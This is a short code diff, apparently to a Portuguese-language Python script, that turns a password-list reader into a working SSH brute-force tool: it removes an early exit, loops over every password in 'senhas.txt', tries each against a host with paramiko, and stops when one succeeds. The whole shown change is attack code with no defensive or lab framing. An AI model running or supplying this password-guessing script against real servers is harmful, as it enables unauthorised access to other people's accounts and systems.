@@ -9,13 +9,14 @@ with open ('senhas.txt', 'r', encoding='latin-1') as file:
     for password in file.readlines():
         print(password.strip())
 
-exit(0)
-ssh = paramiko.SSHClient()
-ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
 
-try:
-    ssh.connect(host, port, username, password)
-    ssh.close
-    print('Senha valida: ' + password)
-except:
-    print('Senha invalida')
+
+        try:
+            ssh.connect(host, port, username, password)
+            ssh.close()
+            print('Senha valida: ' + password)
+            break
+        except:
+            print('Senha invalida')
